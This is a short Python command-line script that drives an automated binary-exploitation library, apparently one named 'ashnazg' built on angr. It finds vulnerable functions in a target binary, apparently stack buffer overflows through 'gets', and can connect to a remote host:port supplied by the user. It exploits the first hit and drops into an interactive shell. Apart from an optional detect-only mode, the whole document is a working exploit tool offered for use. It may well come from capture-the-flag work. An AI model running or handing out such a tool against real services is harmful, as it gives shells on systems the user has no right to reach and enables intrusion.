#!/usr/bin/env python3
import argparse

import ashnazg
import logging

def exploit(options):
    nazg = ashnazg.Ashnazg(options.binary, libc=options.libc)

    # find a vulnerable function
    vulns = list(nazg.find_vulnerable_functions())
    if not vulns:
        print("No vulnerable functions found!")
        return
    vuln = vulns[0]

    # begin exploit
    remote = None
    if options.remote:
        host, port = options.remote.split(":")
        port = int(port)
        remote = (host,port)
    conn = nazg.connect(remote=remote)

    if options.suffix:
        vuln.suffix = options.suffix.replace("\\n","\n")

    # get the program to the vulnerable function
    # input.
    conn.navigate(vuln.entry())

    # 'GETS' vulnerability can be applied immediately if
    # Binary is neither PIE nor canary. This is
    # automatically detected, but we explicitly assume
    # it here.
    conn.exploit(vuln)

    # clear up any output prior to shell
    conn.interactive()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--binary", required=True, help="target binary")
    parser.add_argument("--libc", help="libc to use")
    # TODO: `suffix` is a huge hack. should come
    # up with a generic way of passing exploit specific arguments
    parser.add_argument("--suffix", help="hacky way of passing in suffixes for buffer overflow")
    parser.add_argument("--remote", help="if specified, connect to 'host:port'")
    parser.add_argument("--verbose", action="store_true", help="increase log level")
    parser.add_argument("--detect", action="store_true", help="run detections, do not attempt exploit")
    options = parser.parse_args()

    angr_logger = logging.getLogger('angr')
    angr_logger.setLevel(logging.CRITICAL)

    if options.verbose:
        logging.getLogger("ashnazg").setLevel("DEBUG")
    if options.detect:
        nazg = ashnazg.Ashnazg(options.binary, libc=options.libc)
        for vuln in nazg.find_vulnerable_functions():
            print(vuln)
    else:
        exploit(options)

if __name__=="__main__":
    main()
